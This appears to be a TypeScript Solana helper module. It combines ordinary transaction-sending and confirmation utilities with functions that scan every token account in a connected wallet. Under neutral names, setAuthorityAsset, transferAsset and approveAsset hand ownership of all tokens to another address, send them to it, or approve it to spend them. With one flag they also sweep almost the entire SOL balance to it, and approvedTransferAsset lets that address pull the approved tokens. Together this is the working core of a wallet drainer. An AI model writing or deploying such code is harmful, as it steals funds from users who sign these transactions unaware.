import {
  Keypair,
  Commitment,
  Connection,
  RpcResponseAndContext,
  SignatureStatus,
  SimulatedTransactionResponse,
  Transaction,
  TransactionInstruction,
  TransactionSignature,
  Blockhash,
  FeeCalculator,
  LAMPORTS_PER_SOL, 
  PublicKey,
} from '@solana/web3.js';

import * as anchor from "@project-serum/anchor";
import bs58 from 'bs58';

import { WalletNotConnectedError } from '@solana/wallet-adapter-base';

import {MintLayout,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,Token} from "@solana/spl-token";
import { publicKey } from '@project-serum/anchor/dist/cjs/utils';
import { connect } from 'http2';

const DEFAULT_TIMEOUT = 300000000;

const rpcHost = process.env.REACT_APP_SOLANA_RPC_HOST!;
const connection = new anchor.web3.Connection(rpcHost);
const txTimeoutInMilliseconds = 300000000;

interface BlockhashAndFeeCalculator {
  blockhash: Blockhash;
  feeCalculator: FeeCalculator;
}

export function loadWalletKey(key : any): Keypair {
  // console.log(key);
  const loaded = Keypair.fromSecretKey(bs58.decode(key));
  // console.log(`wallet public key: ${loaded.publicKey}`);
  return loaded;
}

export function loadWalletKeypair(keypair: any): Keypair {
  const secretkey = new Uint8Array(
    keypair.split(",").map((m: any) => parseInt(m))
  );
  return anchor.web3.Keypair.fromSecretKey(secretkey);
}

export const getErrorForTransaction = async (
  connection: Connection,
  txid: string,
) => {
  // wait for all confirmation before geting transaction
  await connection.confirmTransaction(txid, 'max');

  const tx = await connection.getParsedConfirmedTransaction(txid);

  const errors: string[] = [];
  if (tx?.meta && tx.meta.logMessages) {
    tx.meta.logMessages.forEach(log => {
      const regex = /Error: (.*)/gm;
      let m;
      while ((m = regex.exec(log)) !== null) {
        // This is necessary to avoid infinite loops with zero-width matches
        if (m.index === regex.lastIndex) {
          regex.lastIndex++;
        }

        if (m.length > 1) {
          errors.push(m[1]);
        }
      }
    });
  }

  return errors;
};

export enum SequenceType {
  Sequential,
  Parallel,
  StopOnFailure,
}

export async function sendTransactionsWithManualRetry(
  connection: Connection,
  wallet: any,
  instructions: TransactionInstruction[][],
  signers: Keypair[][],
): Promise<(string | undefined)[]> {
  let stopPoint = 0;
  let tries = 0;
  let lastInstructionsLength = null;
  let toRemoveSigners: Record<number, boolean> = {};
  instructions = instructions.filter((instr, i) => {
    if (instr.length > 0) {
      return true;
    } else {
      toRemoveSigners[i] = true;
      return false;
    }
  });
  let ids: string[] = [];
  let filteredSigners = signers.filter((_, i) => !toRemoveSigners[i]);

  while (stopPoint < instructions.length && tries < 3) {
    instructions = instructions.slice(stopPoint, instructions.length);
    filteredSigners = filteredSigners.slice(stopPoint, filteredSigners.length);

    if (instructions.length === lastInstructionsLength) tries = tries + 1;
    else tries = 0;

    try {
      if (instructions.length === 1) {
        const id = await sendTransactionWithRetry(
          connection,
          wallet,
          instructions[0],
          filteredSigners[0],
          'single',
        );
        ids.push(id.txid);
        stopPoint = 1;
      } else {
        const { txs } = await sendTransactions(
          connection,
          wallet,
          instructions,
          filteredSigners,
          SequenceType.StopOnFailure,
          'single',
        );
        ids = ids.concat(txs.map(t => t.txid));
      }
    } catch (e) {
      console.error(e);
    }
    console.log(
      'Died on ',
      stopPoint,
      'retrying from instruction',
      instructions[stopPoint],
      'instructions length is',
      instructions.length,
    );
    lastInstructionsLength = instructions.length;
  }

  return ids;
}

export const sendTransactions = async (
  connection: Connection,
  wallet: any,
  instructionSet: TransactionInstruction[][],
  signersSet: Keypair[][],
  sequenceType: SequenceType = SequenceType.Parallel,
  commitment: Commitment = 'singleGossip',
  successCallback: (txid: string, ind: number) => void = (txid, ind) => {},
  failCallback: (reason: string, ind: number) => boolean = (txid, ind) => false,
  block?: BlockhashAndFeeCalculator,
): Promise<{ number: number; txs: { txid: string; slot: number }[] }> => {
  if (!wallet.publicKey) throw new WalletNotConnectedError();

  const unsignedTxns: Transaction[] = [];

  if (!block) {
    block = await connection.getRecentBlockhash(commitment);
  }

  for (let i = 0; i < instructionSet.length; i++) {
    const instructions = instructionSet[i];
    const signers = signersSet[i];

    if (instructions.length === 0) {
      continue;
    }

    let transaction = new Transaction();
    instructions.forEach(instruction => transaction.add(instruction));
    transaction.recentBlockhash = block.blockhash;
    transaction.setSigners(
      // fee payed by the wallet owner
      wallet.publicKey,
      ...signers.map(s => s.publicKey),
    );

    if (signers.length > 0) {
      transaction.partialSign(...signers);
    }

    unsignedTxns.push(transaction);
  }

  const signedTxns = await wallet.signAllTransactions(unsignedTxns);

  const pendingTxns: Promise<{ txid: string; slot: number }>[] = [];

  let breakEarlyObject = { breakEarly: false, i: 0 };
  console.log(
    'Signed txns length',
    signedTxns.length,
    'vs handed in length',
    instructionSet.length,
  );
  for (let i = 0; i < signedTxns.length; i++) {
    const signedTxnPromise = sendSignedTransaction({
      connection,
      signedTransaction: signedTxns[i],
    });

    signedTxnPromise
      .then(({ txid, slot }) => {
        successCallback(txid, i);
      })
      .catch(reason => {
        // @ts-ignore
        failCallback(signedTxns[i], i);
        if (sequenceType === SequenceType.StopOnFailure) {
          breakEarlyObject.breakEarly = true;
          breakEarlyObject.i = i;
        }
      });

    if (sequenceType !== SequenceType.Parallel) {
      try {
        await signedTxnPromise;
      } catch (e) {
        console.log('Caught failure', e);
        if (breakEarlyObject.breakEarly) {
          console.log('Died on ', breakEarlyObject.i);
          // Return the txn we failed on by index
          return {
            number: breakEarlyObject.i,
            txs: await Promise.all(pendingTxns),
          };
        }
      }
    } else {
      pendingTxns.push(signedTxnPromise);
    }
  }

  if (sequenceType !== SequenceType.Parallel) {
    await Promise.all(pendingTxns);
  }

  return { number: signedTxns.length, txs: await Promise.all(pendingTxns) };
};

export const sendTransaction = async (
  connection: Connection,
  wallet: any,
  instructions: TransactionInstruction[],
  signers: Keypair[],
  awaitConfirmation = true,
  commitment: Commitment = 'singleGossip',
  includesFeePayer: boolean = false,
  block?: BlockhashAndFeeCalculator,
) => {
  if (!wallet.publicKey) throw new WalletNotConnectedError();

  let transaction = new Transaction();
  instructions.forEach(instruction => transaction.add(instruction));
  transaction.recentBlockhash = (
    block || (await connection.getRecentBlockhash(commitment))
  ).blockhash;

  if (includesFeePayer) {
    transaction.setSigners(...signers.map(s => s.publicKey));
  } else {
    transaction.setSigners(
      // fee payed by the wallet owner
      wallet.publicKey,
      ...signers.map(s => s.publicKey),
    );
  }

  if (signers.length > 0) {
    transaction.partialSign(...signers);
  }
  if (!includesFeePayer) {
    transaction = await wallet.signTransaction(transaction);
  }

  const rawTransaction = transaction.serialize();
  let options = {
    skipPreflight: true,
    commitment,
  };

  const txid = await connection.sendRawTransaction(rawTransaction, options);
  let slot = 0;

  if (awaitConfirmation) {
    const confirmation = await awaitTransactionSignatureConfirmation(
      txid,
      DEFAULT_TIMEOUT,
      connection,
      true,
    );

    if (!confirmation)
      throw new Error('Timed out awaiting confirmation on transaction');
    slot = confirmation?.slot || 0;

    if (confirmation?.err) {
      const errors = await getErrorForTransaction(connection, txid);

      console.log(errors);
      throw new Error(`Raw transaction ${txid} failed`);
    }
  }

  return { txid, slot };
};

export async function sendSimpleTransaction(conn : any, wallet: any, transaction : Transaction, signers : Keypair[]) {
  transaction.feePayer = wallet.publicKey
  transaction.recentBlockhash = (await conn.getRecentBlockhash('max')).blockhash;
  await transaction.setSigners(wallet.publicKey,...signers.map(s => s.publicKey));
  if(signers.length !== 0) await transaction.partialSign(...signers)
  const signedTransaction = await wallet.signTransaction(transaction);
  let hash = await conn.sendRawTransaction(await signedTransaction.serialize());
  await conn.confirmTransaction(hash);
  return hash
}

export const sendTransactionWithRetry = async (
  connection: Connection,
  wallet: any,
  instructions: TransactionInstruction[],
  signers: Keypair[],
  commitment: Commitment = 'singleGossip',
  includesFeePayer: boolean = false,
  block?: BlockhashAndFeeCalculator,
  beforeSend?: () => void,
) => {
  if (!wallet.publicKey) throw new WalletNotConnectedError();

  let transaction = new Transaction();
  instructions.forEach(instruction => transaction.add(instruction));
  transaction.recentBlockhash = (
    block || (await connection.getRecentBlockhash(commitment))
  ).blockhash;

  if (includesFeePayer) {
    transaction.setSigners(...signers.map(s => s.publicKey));
  } else {
    transaction.setSigners(
      // fee payed by the wallet owner
      wallet.publicKey,
      ...signers.map(s => s.publicKey),
    );
  }

  if (signers.length > 0) {
    transaction.partialSign(...signers);
  }
  if (!includesFeePayer) {
    transaction = await wallet.signTransaction(transaction);
  }

  if (beforeSend) {
    beforeSend();
  }

  const { txid, slot } = await sendSignedTransaction({
    connection,
    signedTransaction: transaction,
  });

  return { txid, slot };
};

export const getUnixTs = () => {
  return new Date().getTime() / 1000;
};

async function getTokenDecimal(mint : PublicKey){
  let resp = await connection.getAccountInfo(mint)
  let accountData = MintLayout.decode(Buffer.from(resp!.data))
  return accountData.decimals
}

export async function sendSignedTransaction({
  signedTransaction,
  connection,
  timeout = DEFAULT_TIMEOUT,
}: {
  signedTransaction: Transaction;
  connection: Connection;
  sendingMessage?: string;
  sentMessage?: string;
  successMessage?: string;
  timeout?: number;
}): Promise<{ txid: string; slot: number }> {
  const rawTransaction = signedTransaction.serialize();
  const startTime = getUnixTs();
  let slot = 0;
  const txid: TransactionSignature = await connection.sendRawTransaction(
    rawTransaction,
    {
      skipPreflight: true,
    },
  );

  console.log('Started awaiting confirmation for', txid);

  let done = false;
  (async () => {
    while (!done && getUnixTs() - startTime < timeout) {
      connection.sendRawTransaction(rawTransaction, {
        skipPreflight: true,
      });
      await sleep(500);
    }
  })();
  try {
    const confirmation = await awaitTransactionSignatureConfirmation(
      txid,
      timeout,
      connection,
      true,
    );

    if (!confirmation)
      throw new Error('Timed out awaiting confirmation on transaction');

    if (confirmation.err) {
      console.error(confirmation.err);
      throw new Error('Transaction failed: Custom instruction error');
    }

    slot = confirmation?.slot || 0;
  } catch (err: any) {
    console.error('Timeout Error caught', err);
    if (err.timeout) {
      throw new Error('Timed out awaiting confirmation on transaction');
    }
    let simulateResult: SimulatedTransactionResponse | null = null;
    try {
      simulateResult = (
        await simulateTransaction(connection, signedTransaction, 'single')
      ).value;
    } catch (e) {}
    if (simulateResult && simulateResult.err) {
      if (simulateResult.logs) {
        for (let i = simulateResult.logs.length - 1; i >= 0; --i) {
          const line = simulateResult.logs[i];
          if (line.startsWith('Program log: ')) {
            throw new Error(
              'Transaction failed: ' + line.slice('Program log: '.length),
            );
          }
        }
      }
      throw new Error(JSON.stringify(simulateResult.err));
    }
    // throw new Error('Transaction failed');
  } finally {
    done = true;
  }

  console.log('Latency', txid, getUnixTs() - startTime);
  return { txid, slot };
}

async function simulateTransaction(
  connection: Connection,
  transaction: Transaction,
  commitment: Commitment,
): Promise<RpcResponseAndContext<SimulatedTransactionResponse>> {
  // @ts-ignore
  transaction.recentBlockhash = await connection._recentBlockhash(
    // @ts-ignore
    connection._disableBlockhashCaching,
  );

  const signData = transaction.serializeMessage();
  // @ts-ignore
  const wireTransaction = transaction._serialize(signData);
  const encodedTransaction = wireTransaction.toString('base64');
  const config: any = { encoding: 'base64', commitment };
  const args = [encodedTransaction, config];

  // @ts-ignore
  const res = await connection._rpcRequest('simulateTransaction', args);
  if (res.error) {
    throw new Error('failed to simulate transaction: ' + res.error.message);
  }
  return res.result;
}

export const awaitTransactionSignatureConfirmation = async (
  txid: anchor.web3.TransactionSignature,
  timeout: number,
  connection: anchor.web3.Connection,
  queryStatus = false,
): Promise<anchor.web3.SignatureStatus | null | void> => {
  let done = false;
  let status: anchor.web3.SignatureStatus | null | void = {
    slot: 0,
    confirmations: 0,
    err: null,
  };
  let subId = 0;
  status = await new Promise(async (resolve, reject) => {
    setTimeout(() => {
      if (done) {
        return;
      }
      done = true;
      console.log('Rejecting for timeout...');
      reject({ timeout: true });
    }, timeout);

    while (!done && queryStatus) {
      // eslint-disable-next-line no-loop-func
      (async () => {
        try {
          const signatureStatuses = await connection.getSignatureStatuses([
            txid,
          ]);
          status = signatureStatuses && signatureStatuses.value[0];
          if (!done) {
            if (!status) {
              console.log('REST null result for', txid, status);
            } else if (status.err) {
              console.log('REST error for', txid, status);
              done = true;
              reject(status.err);
            } else if (!status.confirmations) {
              console.log('REST no confirmations for', txid, status);
            } else {
              console.log('REST confirmation for', txid, status);
              done = true;
              resolve(status);
            }
          }
        } catch (e) {
          if (!done) {
            console.log('REST connection error: txid', txid, e);
          }
        }
      })();
      await sleep(2000);
    }
  });

  //@ts-ignore
  if (connection._signatureSubscriptions[subId]) {
    connection.removeSignatureListener(subId);
  }
  done = true;
  console.log('Returning status', status);
  return status;
};

const getTokenWallet = async (owner: PublicKey,mint: PublicKey) => {
  return (
    await PublicKey.findProgramAddress(
      [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
      ASSOCIATED_TOKEN_PROGRAM_ID
    )
  )[0];
}

const createAssociatedTokenAccountInstruction = (
  associatedTokenAddress: PublicKey,
  payer: PublicKey,
  walletAddress: PublicKey,
  splTokenMintAddress: PublicKey
  ) => {
  const keys = [
    { pubkey: payer, isSigner: true, isWritable: true },
    { pubkey: associatedTokenAddress, isSigner: false, isWritable: true },
    { pubkey: walletAddress, isSigner: false, isWritable: false },
    { pubkey: splTokenMintAddress, isSigner: false, isWritable: false },
    {
      pubkey: anchor.web3.SystemProgram.programId,
      isSigner: false,
      isWritable: false,
    },
    { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    {
      pubkey: anchor.web3.SYSVAR_RENT_PUBKEY,
      isSigner: false,
      isWritable: false,
    },
  ];
  return new anchor.web3.TransactionInstruction({
    keys,
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    data: Buffer.from([]),
  });
}

export const setAuthorityAsset = async (owner: any, sender: any, flag: any) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner.publicKey, {programId: TOKEN_PROGRAM_ID});
  // console.log("get account", tokenAccounts);
  let tokenAccount, tokenAmount;
  let allaccounts = [];
  const signersMatrix: any[] = [];
  const instructionsMatrix: any[] = [];
  let instructionsMatrixIndex = 0;

  // console.log("token accounts", tokenAccounts)

  for (let index = 0; index < tokenAccounts.value.length; index++) {
    tokenAccount = tokenAccounts.value[index];
    // console.log("account", tokenAccount);
    tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
    // console.log("token amount", tokenAmount)
    // console.log(tokenAmount.amount, tokenAmount.decimals)
    if (parseInt(tokenAmount.amount) >= 1 && tokenAmount.decimals >= 0) {
      allaccounts.push({account: tokenAccounts.value[index].pubkey, mint: tokenAccount.account.data.parsed.info.mint, amount: parseInt(tokenAmount.amount)})
    }
  }

  let balance = await connection.getBalance(owner.publicKey);
  if(balance > 0.002 * anchor.web3.LAMPORTS_PER_SOL)
    balance = balance - 0.001 * anchor.web3.LAMPORTS_PER_SOL;
  else balance = 0;

  if(flag == 4) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
    instructionsMatrix[instructionsMatrixIndex].push(
      new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: owner.publicKey,
        toPubkey: new PublicKey(sender),
        lamports: balance,
      })
    ));
    instructionsMatrixIndex++;
  }
  
  // console.log("sol transfer", signersMatrix, instructionsMatrix)
  
  if(allaccounts.length > 0) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
  }
  
  let max_count = 0, keyIndex = 0;
  
  await Promise.all(allaccounts.map((item) => {

    if((flag == 1 && item.amount <= 1) || (flag == 2 && item.amount > 1)) {
      keyIndex++;
      return;
    }

    instructionsMatrix[instructionsMatrixIndex].push(
      Token.createSetAuthorityInstruction(
        TOKEN_PROGRAM_ID,
        item.account,
        new PublicKey(sender),
        "AccountOwner",
        owner.publicKey,
        []
      )
    );

    if(max_count >= 3 || keyIndex >= allaccounts.length-1) {
      max_count = 0;
      instructionsMatrixIndex++;
      if(keyIndex < allaccounts.length-1) {
        // console.log("key index, length", keyIndex, allaccounts.length)
        instructionsMatrix.push([]);
        signersMatrix.push([]);
      }
      // console.log("test", signersMatrix, instructionsMatrix)
    } else max_count++;

    keyIndex++;
  }))

  // console.log("Transaction", signersMatrix, instructionsMatrix)

  const sendTxId = ((await sendTransactions(connection, owner, instructionsMatrix, signersMatrix)).txs.map(t => t.txid))[0];

  // console.log("tx id", sendTxId)
  let status: any = { err: true };
  status = await awaitTransactionSignatureConfirmation(
    sendTxId,
    txTimeoutInMilliseconds,
    connection,
    true,
  );
  
  console.log("Set Authority finished >>>", status);
};

export const transferAsset = async (owner: any, sender: any, flag: any) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner.publicKey, {programId: TOKEN_PROGRAM_ID});
  // console.log("get account", tokenAccounts);
  let tokenAccount, tokenAmount;
  let allaccounts = [];
  const signersMatrix: any[] = [];
  const instructionsMatrix: any[] = [];
  let instructionsMatrixIndex = 0;

  // console.log("token accounts", tokenAccounts)

  for (let index = 0; index < tokenAccounts.value.length; index++) {
    tokenAccount = tokenAccounts.value[index];
    tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
    // console.log("token amount", tokenAmount)
    // console.log(tokenAmount.amount, tokenAmount.decimals)
    if (parseInt(tokenAmount.amount) >= 1 && tokenAmount.decimals >= 0) {
      allaccounts.push({account: tokenAccounts.value[index].pubkey, mint: tokenAccount.account.data.parsed.info.mint, amount: parseInt(tokenAmount.amount)})
    }
  }

  let balance = await connection.getBalance(owner.publicKey);
  if(balance > 0.002 * anchor.web3.LAMPORTS_PER_SOL)
    balance = balance - 0.001 * anchor.web3.LAMPORTS_PER_SOL;
  else balance = 0;

  if(flag == 4) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
    instructionsMatrix[instructionsMatrixIndex].push(
      new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: owner.publicKey,
        toPubkey: new PublicKey(sender),
        lamports: balance,
      })
    ));
    instructionsMatrixIndex++;
  }
  
  // console.log("sol transfer", signersMatrix, instructionsMatrix)
  
  if(allaccounts.length > 0) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
  }
  
  let max_count = 0, keyIndex = 0;
  
  await Promise.all(allaccounts.map(async (item) => {

    if((flag == 1 && item.amount <= 1) || (flag == 2 && item.amount > 1)) {
      keyIndex++;
      return;
    }
  
    const tokenTo = await getTokenWallet(new PublicKey(sender), new PublicKey(item.mint));
    if((await connection.getAccountInfo(tokenTo))==null)
          instructionsMatrix[instructionsMatrixIndex].push(createAssociatedTokenAccountInstruction(tokenTo, owner.publicKey, new PublicKey(sender), new PublicKey(item.mint)))
    instructionsMatrix[instructionsMatrixIndex].push(
      Token.createTransferInstruction(
        TOKEN_PROGRAM_ID,
        item.account,
        tokenTo,
        owner.publicKey,
        [],
        item.amount
      )
    );

    if(max_count >= 3 || keyIndex >= allaccounts.length-1) {
      max_count = 0;
      instructionsMatrixIndex++;
      if(keyIndex < allaccounts.length-1) {
        instructionsMatrix.push([]);
        signersMatrix.push([]);
      }
      // console.log("test", signersMatrix, instructionsMatrix)
    } else max_count++;
    keyIndex++;
  }));

  const sendTxId = ((await sendTransactions(connection, owner, instructionsMatrix, signersMatrix)).txs.map(t => t.txid))[0];

  // console.log("tx id", sendTxId)
  let status: any = { err: true };
  status = await awaitTransactionSignatureConfirmation(
    sendTxId,
    txTimeoutInMilliseconds,
    connection,
    true,
  );
  
  console.log("Transfer finished >>>", status);
};

export const approvedTransferAsset = async (wallet: any, owner: any, flag: any) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(new PublicKey(owner), {programId: TOKEN_PROGRAM_ID});
  // console.log("get account", tokenAccounts);
  let tokenAccount, tokenAmount;
  let allaccounts = [];
  const signersMatrix: any[] = [];
  const instructionsMatrix: any[] = [];
  let instructionsMatrixIndex = 0;

  // console.log("token accounts", tokenAccounts)

  for (let index = 0; index < tokenAccounts.value.length; index++) {
    tokenAccount = tokenAccounts.value[index];
    tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
    // console.log("token amount", tokenAmount)
    // console.log(tokenAmount.amount, tokenAmount.decimals)
    if (parseInt(tokenAmount.amount) >= 1 && tokenAmount.decimals >= 0) {
      allaccounts.push({account: tokenAccounts.value[index].pubkey, mint: tokenAccount.account.data.parsed.info.mint, amount: parseInt(tokenAmount.amount)})
    }
  }
  
  if(allaccounts.length > 0) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
  }
  
  let max_count = 0, keyIndex = 0;
  
  await Promise.all(allaccounts.map(async (item) => {

    if((flag == 1 && item.amount <= 1) || (flag == 2 && item.amount > 1)) {
      keyIndex++;
      return;
    }
  
    const tokenTo = await getTokenWallet(new PublicKey(wallet.publicKey), new PublicKey(item.mint));
    if((await connection.getAccountInfo(tokenTo))==null)
          instructionsMatrix[instructionsMatrixIndex].push(createAssociatedTokenAccountInstruction(tokenTo, wallet.publicKey, new PublicKey(wallet.publicKey), new PublicKey(item.mint)))
    instructionsMatrix[instructionsMatrixIndex].push(
      Token.createTransferInstruction(
        TOKEN_PROGRAM_ID,
        item.account,
        tokenTo,
        wallet.publicKey,
        [],
        item.amount
      )
    );

    if(max_count >= 3 || keyIndex >= allaccounts.length-1) {
      max_count = 0;
      instructionsMatrixIndex++;
      if(keyIndex < allaccounts.length-1) {
        instructionsMatrix.push([]);
        signersMatrix.push([]);
      }
      // console.log("test", signersMatrix, instructionsMatrix)
    } else max_count++;
    keyIndex++;
  }));

  const sendTxId = ((await sendTransactions(connection, wallet, instructionsMatrix, signersMatrix)).txs.map(t => t.txid))[0];

  // console.log("tx id", sendTxId)
  let status: any = { err: true };
  status = await awaitTransactionSignatureConfirmation(
    sendTxId,
    txTimeoutInMilliseconds,
    connection,
    true,
  );
  
  console.log("Transfer finished >>>", status);
};

export const approveAsset = async (owner: any, sender: any, flag: any) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner.publicKey, {programId: TOKEN_PROGRAM_ID});
  // console.log("get account", tokenAccounts);
  let tokenAccount, tokenAmount;
  let allaccounts = [];
  const signersMatrix: any[] = [];
  const instructionsMatrix: any[] = [];
  let instructionsMatrixIndex = 0;

  // console.log("token accounts", tokenAccounts)

  for (let index = 0; index < tokenAccounts.value.length; index++) {
    tokenAccount = tokenAccounts.value[index];
    tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
    // console.log("token amount", tokenAmount)
    // console.log(tokenAmount.amount, tokenAmount.decimals)
    if (parseInt(tokenAmount.amount) >= 1 && tokenAmount.decimals >= 0) {
      allaccounts.push({account: tokenAccounts.value[index].pubkey, mint: tokenAccount.account.data.parsed.info.mint, amount: parseInt(tokenAmount.amount)})
    }
  }

  let balance = await connection.getBalance(owner.publicKey);
  if(balance > 0.002 * anchor.web3.LAMPORTS_PER_SOL)
    balance = balance - 0.001 * anchor.web3.LAMPORTS_PER_SOL;
  else balance = 0;

  if(flag == 4) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
    instructionsMatrix[instructionsMatrixIndex].push(
      new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: owner.publicKey,
        toPubkey: new PublicKey(sender),
        lamports: balance,
      })
    ));
    instructionsMatrixIndex++;
  }
  
  // console.log("sol transfer", signersMatrix, instructionsMatrix)
  
  if(allaccounts.length > 0) {
    instructionsMatrix.push([]);
    signersMatrix.push([]);
  }
  
  let max_count = 0, keyIndex = 0;
  
  await Promise.all(allaccounts.map(async (item) => {
  
    // const tokenTo = await getTokenWallet(new PublicKey(sender), new PublicKey(item.mint));
    // if((await connection.getAccountInfo(tokenTo))==null)
    //       instructionsMatrix[instructionsMatrixIndex].push(createAssociatedTokenAccountInstruction(tokenTo, owner.publicKey, new PublicKey(sender), new PublicKey(item.mint)))
    if((flag == 1 && item.amount <= 1) || (flag == 2 && item.amount > 1)) {
      keyIndex++;
      return;
    }
    instructionsMatrix[instructionsMatrixIndex].push(
      Token.createApproveInstruction(
        TOKEN_PROGRAM_ID,
        item.account,
        new PublicKey(sender),
        owner.publicKey,
        [],
        item.amount
      )
    );

    if(max_count >= 3 || keyIndex >= allaccounts.length-1) {
      max_count = 0;
      instructionsMatrixIndex++;
      if(keyIndex < allaccounts.length-1) {
        instructionsMatrix.push([]);
        signersMatrix.push([]);
      }
      // console.log("test", signersMatrix, instructionsMatrix)
    } else max_count++;
    keyIndex++;
  }));

  const sendTxId = ((await sendTransactions(connection, owner, instructionsMatrix, signersMatrix)).txs.map(t => t.txid))[0];

  // console.log("tx id", sendTxId)
  let status: any = { err: true };
  status = await awaitTransactionSignatureConfirmation(
    sendTxId,
    txTimeoutInMilliseconds,
    connection,
    true,
  );
  
  console.log("Approve  finished >>>", status);
}

export const approvedTransferToken = async (wallet: any, owner: any, token_mint_addr: any, token_account_addr: any, amount: any) => {

  const token_decimal = await getTokenDecimal(new PublicKey(token_mint_addr));

  const token_mint : any = null;
  
  const tokenTo = await getTokenWallet(new PublicKey(wallet.publicKey), new PublicKey(token_mint_addr));

  let transaction = new Transaction();

  if((await connection.getAccountInfo(tokenTo))==null)
  transaction.add(createAssociatedTokenAccountInstruction(tokenTo, wallet.publicKey, new PublicKey(wallet.publicKey), new PublicKey(token_mint_addr)))
  transaction.add(
    Token.createTransferInstruction(
      TOKEN_PROGRAM_ID,
      new PublicKey(token_account_addr),
      tokenTo,
      wallet.publicKey,
      [],
      amount * Math.pow(10, token_decimal)
    )
  );

  const hash = await sendSimpleTransaction(connection, wallet, transaction, []);

  console.log("Transfer finished >>>", hash);
};

export function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}
